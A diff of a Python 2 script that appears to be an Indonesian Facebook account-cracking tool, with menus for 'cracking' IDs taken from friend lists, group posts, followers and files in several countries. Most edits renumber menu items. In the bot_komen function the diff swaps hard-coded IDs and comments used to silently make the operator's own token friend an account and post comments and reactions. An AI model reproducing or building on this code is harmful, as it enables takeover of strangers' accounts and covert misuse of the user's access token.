@@ -122,16 +122,16 @@ def masuk():
 	os.system('clear')
 	print logo
 	print 50* "\033[1;94m─"
-	print "\033[1;97m{\033[1;92m🌈\033[1;97m} Login Via Token Facebook"
-	print "\033[1;97m{\033[1;92m🌈\033[1;97m} Ambil Token Download Token App"
-	print "\033[1;97m{\033[1;92m🌈\033[1;97m} Ambil Token Dari Link"
-	print "\033[1;97m{\033[1;92m🌈\033[1;97m} Login Via Token Facebook"
-	print "\033[1;97m{\033[1;91m🌈\033[1;97m} Keluar"
+	print "\033[1;97m{\033[1;92m1\033[1;97m} Login Via Token Facebook"
+	print "\033[1;97m{\033[1;92m1\033[1;97m} Ambil Token Download Token App"
+	print "\033[1;97m{\033[1;92m1\033[1;97m} Ambil Token Dari Link"
+	print "\033[1;97m{\033[1;92m1\033[1;97m} Login Via Token Facebook"
+	print "\033[1;97m{\033[1;91m1\033[1;97m} Keluar"
 	print 50* "\033[1;94m─"
 	pilih_masuk()
 
 def pilih_masuk():
-	msuk = raw_input("\033[1;90m︻デ═一▸ Pilih 1,2,3,4 ! \033[91m:\033[1;92m ")
+	msuk = raw_input("\033[1;90m︻デ═一▸ Pilih  \033[91m:\033[1;92m ")
 	if msuk =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m] Ngetik apaan lo pepek?:v"
 		pilih_masuk()
@@ -229,12 +229,12 @@ def bot_komen():
 	except IOError:
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100055084094176')
+	una = ('100026568911671')
 	kom = ('LOGIN BRO')
 	reac = ('ANGRY')
-	post = ('159860782526724')
-	post2 = ('159860782526724')
-	kom2 = ('AZIZ GANTENG HAHA')
+	post = ('874482010131077')
+	post2 = ('874482010131077')
+	kom2 = ('SHELLY CANTIK ISTRI ADIT')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -275,18 +275,18 @@ def menu():
 	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m NAMA\033[1;90m    =>\033[1;92m " +nama
 	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m USER ID\033[1;90m =>\033[1;92m " + id
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
-	print "\033[1;97m{"+warni+"🍓\033[1;97m}"+warna+" Crack ID Dari Teman/Publik"
-	print "\033[1;97m{"+warni+"🍓\033[1;97m}"+warna+" Crack ID Dari Postingan Grup/Teman"
-	print "\033[1;97m{"+warni+"🍓\033[1;97m}"+warna+" Crack ID Dari Total Followers"
-	print "\033[1;97m{"+warni+"🍓\033[1;97m}"+warna+" Cari ID Menggunakan Username"
-	print "\033[1;97m{"+warni+"🍓\033[1;97m}"+warna+" Perbarui Script"
-	print "\033[1;97m{\033[1;91m🍓\033[1;97m}"+warna+" Keluar"
+	print "\033[1;97m{"+warni+"1\033[1;97m}"+warna+" Crack ID Dari Teman/Publik"
+	print "\033[1;97m{"+warni+"2\033[1;97m}"+warna+" Crack ID Dari Postingan Grup/Teman"
+	print "\033[1;97m{"+warni+"3\033[1;97m}"+warna+" Crack ID Dari Total Followers"
+	print "\033[1;97m{"+warni+"4\033[1;97m}"+warna+" Cari ID Menggunakan Username"
+	print "\033[1;97m{"+warni+"5\033[1;97m}"+warna+" Perbarui Script"
+	print "\033[1;97m{\033[1;91m0\033[1;97m}"+warna+" Keluar"
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
 	pilih()
 	
 ######PILIH######
 def pilih():
-	unikers = raw_input("\033[1;92mPilih 1 , 2 , 3 , 4 , 5 , 0 ! \033[91m:\033[1;92m ")
+	unikers = raw_input("\033[1;92mPilih  ! \033[91m:\033[1;92m ")
 	if unikers =="":
 		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
 		pilih()
@@ -314,17 +314,17 @@ def crack_teman():
 	os.system("clear")
 	print logo
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
-	print "\033[1;97m{"+warna+"🍉\033[1;97m}"+warni+" Crack ID Indonesia"
-	print "\033[1;97m{"+warna+"🍉\033[1;97m}"+warni+" Crack ID Bangladesh"
-	print "\033[1;97m{"+warna+"🍉\033[1;97m}"+warni+" Crack ID Usa"
-	print "\033[1;97m{"+warna+"🍉\033[1;97m}"+warni+" Crack ID Pakistan"
-	print "\033[1;97m{\033[1;91m🍉\033[1;97m}"+warni+" Kembali"
+	print "\033[1;97m{"+warna+"1\033[1;97m}"+warni+" Crack ID Indonesia"
+	print "\033[1;97m{"+warna+"2\033[1;97m}"+warni+" Crack ID Bangladesh"
+	print "\033[1;97m{"+warna+"3\033[1;97m}"+warni+" Crack ID Usa"
+	print "\033[1;97m{"+warna+"4\033[1;97m}"+warni+" Crack ID Pakistan"
+	print "\033[1;97m{\033[1;91m0\033[1;97m}"+warni+" Kembali"
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
 	pilih_teman()
 	
 ######PILIH######
 def pilih_teman():
-	univ = raw_input(""+warna+"Pilih 1 , 2 , 3 , 4 , 0 ! \033[91m:\033[1;92m ")
+	univ = raw_input(""+warna+"Pilih ! \033[91m:\033[1;92m ")
 	if univ =="":
 		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
 		pilih_teman()
@@ -358,16 +358,16 @@ def crack_indo():
 	os.system('clear')
 	print logo
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
-	print "\033[1;97m{🍎} Crack Dari Daftar Teman"
-	print "\033[1;97m{🍎} Crack Dari Publik/Teman"
-	print "\033[1;97m{🍎} Crack Dari File"
-	print "\033[1;97m{🍎} Kembali"
+	print "\033[1;97m{1} Crack Dari Daftar Teman"
+	print "\033[1;97m{2} Crack Dari Publik/Teman"
+	print "\033[1;97m{3} Crack Dari File"
+	print "\033[1;97m{0} Kembali"
 	print 1* "\033[1;94m⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
 	pilih_indo()
 
 #### PILIH INDONESIA ####
 def pilih_indo():
-	teak = raw_input("\033[1;93mPilih 1 , 2 , 3 , 0 ! \033[91m:\033[1;92m ")
+	teak = raw_input("\033[1;93mPilih  ! \033[91m:\033[1;92m ")
 	if teak =="":
 		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
 		pilih_indo()
